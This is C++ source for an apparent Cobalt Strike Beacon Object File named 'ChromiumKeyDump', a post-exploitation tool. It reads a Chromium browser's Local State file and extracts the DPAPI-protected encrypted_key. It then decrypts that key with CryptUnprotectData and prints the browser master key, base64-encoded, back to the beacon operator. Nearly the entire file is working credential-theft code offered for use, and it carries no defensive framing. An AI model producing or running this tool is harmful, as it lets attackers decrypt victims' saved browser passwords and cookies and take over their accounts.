#define _WIN32_WINNT 0x06000000

#include <windows.h>
#include <wincrypt.h>

extern "C" {
#include "beacon.h"
}

#define BOF_REDECLARE(mod, func) extern "C" __declspec(dllimport) decltype(func) mod ## $ ## func
#define BOF_LOCAL(mod, func) decltype(func) * func = mod ## $ ## func

BOF_REDECLARE(KERNEL32, ReadFile);
BOF_REDECLARE(KERNEL32, CreateFileW);
BOF_REDECLARE(KERNEL32, CloseHandle);
BOF_REDECLARE(KERNEL32, GetFileSizeEx);
BOF_REDECLARE(KERNEL32, GetLastError);
BOF_REDECLARE(KERNEL32, LocalFree);
BOF_REDECLARE(KERNEL32, MultiByteToWideChar);
BOF_REDECLARE(CRYPT32, CryptStringToBinaryA);
BOF_REDECLARE(CRYPT32, CryptBinaryToStringA);
BOF_REDECLARE(CRYPT32, CryptUnprotectData);
BOF_REDECLARE(MSVCRT, malloc);
BOF_REDECLARE(MSVCRT, free);

#define BOF_LOCALS \
    BOF_LOCAL(KERNEL32, ReadFile); \
    BOF_LOCAL(KERNEL32, CreateFileW); \
    BOF_LOCAL(KERNEL32, CloseHandle); \
    BOF_LOCAL(KERNEL32, GetFileSizeEx); \
    BOF_LOCAL(KERNEL32, GetLastError); \
    BOF_LOCAL(KERNEL32, LocalFree); \
    BOF_LOCAL(KERNEL32, MultiByteToWideChar); \
    BOF_LOCAL(CRYPT32, CryptStringToBinaryA); \
    BOF_LOCAL(CRYPT32, CryptBinaryToStringA); \
    BOF_LOCAL(CRYPT32, CryptUnprotectData); \
    BOF_LOCAL(MSVCRT, malloc); \
    BOF_LOCAL(MSVCRT, free)

extern "C" void go(char* args, int alen) {
    BOF_LOCALS;

    datap parser;
    BeaconDataParse(&parser, args, alen);
    int pathBytes = 0;
    char* path = BeaconDataExtract(&parser, &pathBytes);
    if (path == NULL || pathBytes < 2 || pathBytes > MAX_PATH * 4 || path[pathBytes - 1] != '\0') {
        BeaconPrintf(CALLBACK_ERROR, "[ChromiumKeyDump] Expected a Local State path\n");
        return;
    }
    for (int i = 0; i < pathBytes - 1; ++i) {
        if (path[i] == '\0') {
            BeaconPrintf(CALLBACK_ERROR, "[ChromiumKeyDump] Invalid Local State path\n");
            return;
        }
    }

    WCHAR widePath[MAX_PATH];
    if (MultiByteToWideChar(CP_UTF8, MB_ERR_INVALID_CHARS, path, pathBytes, widePath, MAX_PATH) == 0) {
        BeaconPrintf(CALLBACK_ERROR, "[ChromiumKeyDump] Invalid or overlong Local State path\n");
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[ChromiumKeyDump] Target File: %S\n", widePath);

    HANDLE file = INVALID_HANDLE_VALUE;
    char* contents = NULL;
    BYTE* encrypted = NULL;
    char* encoded = NULL;
    DATA_BLOB plaintext = {0, NULL};

    do {
        file = CreateFileW(widePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
        if (file == INVALID_HANDLE_VALUE) {
            BeaconPrintf(CALLBACK_ERROR, "[ChromiumKeyDump] CreateFileW failed lasterror=%08x\n", GetLastError());
            break;
        }

        LARGE_INTEGER fileSize;
        if (!GetFileSizeEx(file, &fileSize) || fileSize.QuadPart < 0 ||
            fileSize.QuadPart > 16 * 1024 * 1024) {
            BeaconPrintf(CALLBACK_ERROR, "[ChromiumKeyDump] Local State is too large or cannot be read\n");
            break;
        }

        DWORD length = (DWORD)fileSize.QuadPart;
        contents = (char*)malloc((size_t)length + 1);
        if (contents == NULL) {
            BeaconPrintf(CALLBACK_ERROR, "[ChromiumKeyDump] Could not allocate Local State buffer\n");
            break;
        }

        DWORD total = 0;
        while (total < length) {
            DWORD received = 0;
            if (!ReadFile(file, contents + total, length - total, &received, NULL) || received == 0) {
                BeaconPrintf(CALLBACK_ERROR, "[ChromiumKeyDump] Could not read Local State\n");
                break;
            }
            total += received;
        }
        if (total != length) {
            break;
        }
        contents[length] = '\0';

        // Chromium stores a base64-encoded DPAPI blob in os_crypt.encrypted_key.
        // Search within the bytes actually read; never scan beyond the buffer.
        const char marker[] = "\"encrypted_key\"";
        const DWORD markerLength = sizeof(marker) - 1;
        DWORD keyStart = length;
        DWORD keyEnd = length;
        for (DWORD i = 0; i + markerLength < length; ++i) {
            DWORD matched = 0;
            while (matched < markerLength && contents[i + matched] == marker[matched]) {
                ++matched;
            }
            if (matched != markerLength) {
                continue;
            }
            DWORD pos = i + markerLength;
            while (pos < length && (contents[pos] == ' ' || contents[pos] == '\t' || contents[pos] == '\r' || contents[pos] == '\n')) {
                ++pos;
            }
            if (pos >= length || contents[pos++] != ':') {
                continue;
            }
            while (pos < length && (contents[pos] == ' ' || contents[pos] == '\t' || contents[pos] == '\r' || contents[pos] == '\n')) {
                ++pos;
            }
            if (pos >= length || contents[pos++] != '"') {
                continue;
            }
            keyStart = pos;
            while (pos < length && contents[pos] != '"') {
                ++pos;
            }
            keyEnd = pos;
            break;
        }
        if (keyStart >= keyEnd || keyEnd >= length) {
            BeaconPrintf(CALLBACK_ERROR, "[ChromiumKeyDump] EncryptedKey not found\n");
            break;
        }

        DWORD encryptedLength = 0;
        if (!CryptStringToBinaryA(contents + keyStart, keyEnd - keyStart, CRYPT_STRING_BASE64,
                                  NULL, &encryptedLength, NULL, NULL) || encryptedLength <= 5) {
            BeaconPrintf(CALLBACK_ERROR, "[ChromiumKeyDump] Invalid encrypted key encoding\n");
            break;
        }
        encrypted = (BYTE*)malloc(encryptedLength);
        if (encrypted == NULL || !CryptStringToBinaryA(contents + keyStart, keyEnd - keyStart,
                                                        CRYPT_STRING_BASE64, encrypted, &encryptedLength,
                                                        NULL, NULL)) {
            BeaconPrintf(CALLBACK_ERROR, "[ChromiumKeyDump] Could not decode encrypted key\n");
            break;
        }
        const char prefix[] = "DPAPI";
        bool hasPrefix = encryptedLength > 5;
        for (DWORD i = 0; i < 5 && hasPrefix; ++i) {
            hasPrefix = encrypted[i] == (BYTE)prefix[i];
        }
        if (!hasPrefix) {
            BeaconPrintf(CALLBACK_ERROR, "[ChromiumKeyDump] Unsupported encrypted key format\n");
            break;
        }

        DATA_BLOB ciphertext = {encryptedLength - 5, encrypted + 5};
        if (!CryptUnprotectData(&ciphertext, NULL, NULL, NULL, NULL, 0, &plaintext)) {
            BeaconPrintf(CALLBACK_ERROR, "[ChromiumKeyDump] CryptUnprotectData failed\n");
            break;
        }

        DWORD encodedLength = 0;
        const DWORD flags = CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF;
        if (!CryptBinaryToStringA(plaintext.pbData, plaintext.cbData, flags, NULL, &encodedLength) ||
            encodedLength == 0) {
            BeaconPrintf(CALLBACK_ERROR, "[ChromiumKeyDump] Could not encode decrypted key\n");
            break;
        }
        encoded = (char*)malloc(encodedLength);
        if (encoded == NULL || !CryptBinaryToStringA(plaintext.pbData, plaintext.cbData, flags,
                                                      encoded, &encodedLength)) {
            BeaconPrintf(CALLBACK_ERROR, "[ChromiumKeyDump] Could not encode decrypted key\n");
            break;
        }
        BeaconPrintf(CALLBACK_OUTPUT, "[ChromiumKeyDump] Masterkey: %s\n", encoded);
    } while (false);

    if (encoded != NULL) free(encoded);
    if (plaintext.pbData != NULL) LocalFree(plaintext.pbData);
    if (encrypted != NULL) free(encrypted);
    if (contents != NULL) free(contents);
    if (file != INVALID_HANDLE_VALUE) CloseHandle(file);
}
